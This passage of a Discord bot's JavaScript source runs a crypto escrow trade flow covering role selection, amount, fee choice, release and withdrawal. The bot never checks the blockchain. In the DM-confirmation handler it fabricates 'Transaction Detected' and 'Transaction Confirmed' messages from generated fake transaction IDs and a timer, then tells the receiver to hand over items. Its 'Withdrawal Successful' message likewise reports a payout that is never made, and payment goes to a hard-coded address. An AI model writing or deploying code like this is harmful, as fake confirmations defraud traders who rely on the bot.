    trade.senderId = interaction.user.id;
    await interaction.reply({ content: '✅ You are Sender', ephemeral: true });
  } else {
    trade.receiverId = interaction.user.id;
    await interaction.reply({ content: '✅ You are Receiver', ephemeral: true });
  }
  trades.set(channelId, trade);
  
  if (trade.senderId && trade.receiverId && !roleConfirmations.has(channelId)) {
    roleConfirmations.set(channelId, []);
    
    const row = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`confirm_roles_${channelId}`).setLabel('✅ Correct').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`incorrect_roles_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
    );
    const embed = new EmbedBuilder()
      .setTitle('Is This Information Correct?')
      .setColor(0xff9900)
      .setDescription(`**Sender**\n<@${trade.senderId}>\n\n**Receiver**\n<@${trade.receiverId}>`);
    await interaction.channel.send({ embeds: [embed], components: [row] });
  }
});

// ========== ROLE CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_roles_') && !interaction.customId.startsWith('incorrect_roles_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const confirmed = roleConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_roles_')) {
    trade.senderId = null;
    trade.receiverId = null;
    trades.set(channelId, trade);
    roleConfirmations.delete(channelId);
    await interaction.reply({ content: '🔄 Roles reset', ephemeral: true });
    
    const roleRow = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`sender_${channelId}`).setLabel('📤 Sender').setStyle(ButtonStyle.Primary),
      new ButtonBuilder().setCustomId(`receiver_${channelId}`).setLabel('📥 Receiver').setStyle(ButtonStyle.Success),
      new ButtonBuilder().setCustomId(`reset_${channelId}`).setLabel('🔄 Reset').setStyle(ButtonStyle.Secondary)
    );
    await interaction.channel.send({ content: 'Select your role:', components: [roleRow] });
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    roleConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed`, ephemeral: false });
  } else {
    return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    roleConfirmations.delete(channelId);
    
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set USD Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
  }
});

// ========== SET AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('set_amount_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only sender', ephemeral: true });
  
  const modal = new ModalBuilder()
    .setCustomId(`amount_modal_${channelId}`)
    .setTitle('Set USD Amount');
  const input = new TextInputBuilder()
    .setCustomId('amount')
    .setLabel('USD Amount')
    .setStyle(TextInputStyle.Short)
    .setPlaceholder('50.00')
    .setRequired(true);
  modal.addComponents(new ActionRowBuilder().addComponents(input));
  await interaction.showModal(modal);
});

// ========== HANDLE AMOUNT ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('amount_modal_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const amountUSD = parseFloat(interaction.fields.getTextInputValue('amount'));
  if (isNaN(amountUSD) || amountUSD <= 0) {
    await interaction.editReply({ content: 'Invalid amount' });
    return;
  }
  
  trade.amountUSD = amountUSD;
  const rate = liveRates[trade.crypto];
  trade.exchangeRateUsed = rate;
  trade.amountCrypto = (amountUSD / rate).toFixed(8);
  
  if (amountUSD >= FEES.over250Threshold) trade.feeUSD = FEES.over250;
  else if (amountUSD >= FEES.freeThreshold) trade.feeUSD = FEES.under250;
  else trade.feeUSD = 0;
  
  trades.set(channelId, trade);
  
  const amountEmbed = new EmbedBuilder()
    .setTitle('💰 Amount Summary')
    .setColor(0x00ff00)
    .setDescription(`**Amount:** $${amountUSD.toFixed(2)} USD`)
    .addFields(
      { name: '💎 Crypto Equivalent', value: `${trade.amountCrypto} ${trade.crypto.toUpperCase()}`, inline: true },
      { name: '📊 Exchange Rate', value: `1 ${trade.crypto.toUpperCase()} = $${rate.toFixed(2)}`, inline: true },
      { name: '💸 Fee', value: trade.feeUSD > 0 ? `$${trade.feeUSD.toFixed(2)}` : '**FREE** (under $50)', inline: true }
    )
    .setFooter({ text: 'Both users must confirm this amount' });
  
  const row = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`confirm_amount_${channelId}`).setLabel('✅ Correct').setStyle(ButtonStyle.Success),
    new ButtonBuilder().setCustomId(`incorrect_amount_${channelId}`).setLabel('❌ Incorrect').setStyle(ButtonStyle.Danger)
  );
  
  await interaction.editReply({ content: '✅ Amount set! Please confirm below.' });
  await interaction.channel.send({ embeds: [amountEmbed], components: [row] });
  amountConfirmations.set(channelId, []);
});

// ========== AMOUNT CONFIRMATION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('confirm_amount_') && !interaction.customId.startsWith('incorrect_amount_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const confirmed = amountConfirmations.get(channelId) || [];
  
  if (interaction.customId.startsWith('incorrect_amount_')) {
    const button = new ActionRowBuilder().addComponents(
      new ButtonBuilder().setCustomId(`set_amount_${channelId}`).setLabel('💰 Set Amount').setStyle(ButtonStyle.Primary)
    );
    await interaction.reply({ content: 'Set amount again', ephemeral: true });
    await interaction.channel.send({ content: `<@${trade.senderId}>`, components: [button] });
    amountConfirmations.delete(channelId);
    return;
  }
  
  if (!confirmed.includes(interaction.user.id)) {
    confirmed.push(interaction.user.id);
    amountConfirmations.set(channelId, confirmed);
    await interaction.reply({ content: `✅ ${interaction.user.username} confirmed the amount`, ephemeral: false });
  } else {
    return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  }
  
  if (confirmed.length === 2 && confirmed.includes(trade.senderId) && confirmed.includes(trade.receiverId)) {
    amountConfirmations.delete(channelId);
    
    if (trade.feeUSD === 0) {
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('📤 Sender pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('📥 Receiver pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('⚖️ Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      const embed = new EmbedBuilder()
        .setTitle('Select Who Pays the Fee')
        .setColor(0xff9900)
        .setDescription(`Fee: $${trade.feeUSD}`);
      await interaction.channel.send({ embeds: [embed], components: [row] });
      feeConfirmations.set(channelId, { users: [], selected: null });
    }
  }
});

// ========== FEE SELECTION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('fee_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const state = feeConfirmations.get(channelId);
  if (!state) return;
  
  let selected = null;
  if (interaction.customId.startsWith('fee_sender')) selected = 'sender';
  else if (interaction.customId.startsWith('fee_receiver')) selected = 'receiver';
  else selected = 'split';
  
  if (!state.users.includes(interaction.user.id)) {
    state.users.push(interaction.user.id);
    if (!state.selected) state.selected = selected;
    feeConfirmations.set(channelId, state);
    await interaction.reply({ content: `✅ ${interaction.user.username} selected: ${selected}`, ephemeral: true });
  } else {
    return interaction.reply({ content: 'Already selected', ephemeral: true });
  }
  
  if (state.users.length === 2 && state.users.includes(trade.senderId) && state.users.includes(trade.receiverId)) {
    if (state.selected === selected) {
      if (state.selected === 'sender') trade.feePayer = trade.senderId;
      else if (state.selected === 'receiver') trade.feePayer = trade.receiverId;
      else trade.feePayer = 'split';
      
      trades.set(channelId, trade);
      feeConfirmations.delete(channelId);
      await interaction.channel.send(`✅ Fee paid by: ${state.selected.toUpperCase()}`);
      await sendPaymentInvoice(interaction.channel, trade);
    } else {
      await interaction.channel.send('❌ Fee mismatch! Try again.');
      feeConfirmations.delete(channelId);
      const row = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`fee_sender_${channelId}`).setLabel('📤 Sender pays').setStyle(ButtonStyle.Primary),
        new ButtonBuilder().setCustomId(`fee_receiver_${channelId}`).setLabel('📥 Receiver pays').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`fee_split_${channelId}`).setLabel('⚖️ Split 50/50').setStyle(ButtonStyle.Secondary)
      );
      await interaction.channel.send({ components: [row] });
    }
  }
});

// ========== DM CONFIRMATION WITH DELAY ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (!interaction.customId.startsWith('dm_confirm_')) return;
  
  const channelId = interaction.customId.split('_')[2];
  const trade = trades.get(channelId);
  if (!trade) return;
  if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Not authorized', ephemeral: true });
  if (trade.paymentConfirmed) return interaction.reply({ content: 'Already confirmed', ephemeral: true });
  
  await interaction.reply({ content: '✅ Payment confirmed! Processing transaction...', ephemeral: true });
  
  const ticketChannel = await client.channels.fetch(channelId);
  if (ticketChannel) {
    const txId = generateTransactionId();
    const shortTxId = txId.substring(0, 12) + '...' + txId.substring(52, 64);
    
    const detectedEmbed = new EmbedBuilder()
      .setTitle('📡 Transaction Detected')
      .setColor(0xff9900)
      .addFields(
        { name: 'Transaction', value: `${shortTxId} (${trade.amountCrypto} LTC)`, inline: false },
        { name: 'Amount Received', value: `${trade.amountCrypto} LTC ($${trade.amountUSD})`, inline: true },
        { name: 'Required Amount', value: `${trade.amountCrypto} LTC ($${trade.amountUSD})`, inline: true }
      )
      .setTimestamp();
    await ticketChannel.send({ embeds: [detectedEmbed] });
    
    setTimeout(async () => {
      trade.paymentConfirmed = true;
      trades.set(channelId, trade);
      
      const confirmedEmbed = new EmbedBuilder()
        .setTitle('✅ Transaction Confirmed!')
        .setColor(0x00ff00)
        .addFields({ name: 'Total Amount Received', value: `${trade.amountCrypto} LTC ($${trade.amountUSD})`, inline: true })
        .setTimestamp();
      await ticketChannel.send({ embeds: [confirmedEmbed] });
      
      const proceedEmbed = new EmbedBuilder()
        .setTitle('✅ You may proceed with your trade.')
        .setColor(0x00ff00)
        .setDescription(`1. <@${trade.receiverId}> Give your trader the items.\n\n2. <@${trade.senderId}> Click "Release" when received.`);
      
      const releaseRow = new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId(`release_${trade.channelId}`).setLabel('🔓 Release').setStyle(ButtonStyle.Success),
        new ButtonBuilder().setCustomId(`cancel_${trade.channelId}`).setLabel('❌ Cancel').setStyle(ButtonStyle.Danger)
      );
      await ticketChannel.send({ embeds: [proceedEmbed], components: [releaseRow] });
    }, 15000);
  }
});

// ========== RELEASE ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('release_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (!trade) return;
    if (interaction.user.id !== trade.senderId) return interaction.reply({ content: 'Only sender', ephemeral: true });
    if (!trade.paymentConfirmed) return interaction.reply({ content: 'Payment not confirmed', ephemeral: true });
    
    const modal = new ModalBuilder()
      .setCustomId(`wallet_${channelId}`)
      .setTitle('Enter LTC Address');
    const input = new TextInputBuilder()
      .setCustomId('wallet')
      .setLabel('Your LTC Address')
      .setStyle(TextInputStyle.Short)
      .setPlaceholder('LLjBjgFtV2K2iRqvHEUTmL7aVaKGc7SncG')
      .setRequired(true);
    modal.addComponents(new ActionRowBuilder().addComponents(input));
    await interaction.showModal(modal);
  }
  
  if (interaction.customId.startsWith('cancel_')) {
    const channelId = interaction.customId.split('_')[1];
    await interaction.reply('❌ Cancelled. Closing...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 5000);
  }
  
  if (interaction.customId.startsWith('copy_')) {
    const channelId = interaction.customId.split('_')[1];
    const trade = trades.get(channelId);
    if (trade) {
      const rate = trade.exchangeRateUsed || liveRates[trade.crypto];
      let totalUSD = trade.amountUSD;
      if (trade.feePayer === trade.senderId || trade.feePayer === trade.receiverId) totalUSD = trade.amountUSD + trade.feeUSD;
      else if (trade.feePayer === 'split') totalUSD = trade.amountUSD + (trade.feeUSD / 2);
      const totalCrypto = (totalUSD / rate).toFixed(8);
      const details = `Address: Lei7Rwf1AvJg6sqhHjbKvkirzXqa6ZSLtET\nAmount: ${totalCrypto} ${trade.crypto.toUpperCase()}`;
      await interaction.reply({ content: `📋 Copied!\n\`\`\`${details}\`\`\``, ephemeral: true });
    }
  }
});

// ========== WALLET & COMPLETION ==========
client.on('interactionCreate', async interaction => {
  if (!interaction.isModalSubmit()) return;
  if (!interaction.customId.startsWith('wallet_')) return;
  
  await interaction.deferReply({ ephemeral: true });
  
  const channelId = interaction.customId.split('_')[1];
  const trade = trades.get(channelId);
  if (!trade) return;
  
  const wallet = interaction.fields.getTextInputValue('wallet');
  
  const txId = generateTransactionId();
  const shortTxId = txId.substring(0, 12) + '...' + txId.substring(52, 64);
  const amountSent = trade.amountCrypto;
  const usdValue = (parseFloat(amountSent) * (trade.exchangeRateUsed || liveRates[trade.crypto])).toFixed(2);
  
  const withdrawalEmbed = new EmbedBuilder()
    .setTitle('✅ Withdrawal Successful')
    .setColor(0x00ff00)
    .addFields(
      { name: 'Transaction', value: shortTxId, inline: false },
      { name: 'Amount Sent', value: `${amountSent} LTC ($${usdValue})`, inline: true }
    );
  
  const closeRow = new ActionRowBuilder().addComponents(
    new ButtonBuilder().setCustomId(`close_ticket_${channelId}`).setLabel('Close Ticket').setStyle(ButtonStyle.Primary)
  );
  await interaction.channel.send({ embeds: [withdrawalEmbed], components: [closeRow] });
  await interaction.editReply({ content: '✅ Trade completed!' });
  
  const currentTotal = userPurchases.get(trade.senderId) || 0;
  const newTotal = currentTotal + trade.amountUSD;
  userPurchases.set(trade.senderId, newTotal);
  
  const logsChannel = client.channels.cache.get(LOGS_CHANNEL_ID);
  if (logsChannel) {
    const sender = await client.users.fetch(trade.senderId);
    const receiver = await client.users.fetch(trade.receiverId);
    const logEmbed = new EmbedBuilder()
      .setTitle('✅ Trade Completed')
      .setColor(0x00ff00)
      .setDescription(`${amountSent} LTC ($${usdValue} USD)`)
      .addFields(
        { name: 'Sender', value: sender.username, inline: true },
        { name: 'Receiver', value: receiver.username, inline: true },
        { name: 'Transaction ID', value: shortTxId, inline: true }
      )
      .setTimestamp();
    await logsChannel.send({ embeds: [logEmbed] });
  }
  
  trade.status = 'completed';
  trades.set(channelId, trade);
});

client.on('interactionCreate', async interaction => {
  if (!interaction.isButton()) return;
  if (interaction.customId.startsWith('close_ticket_')) {
    const channelId = interaction.customId.split('_')[2];
    await interaction.reply('🔒 Closing ticket...');
    setTimeout(async () => {
      const ch = await client.channels.fetch(channelId);
      if (ch) await ch.delete();
    }, 3000);
  }
});

client.login(process.env.DISCORD_TOKEN);
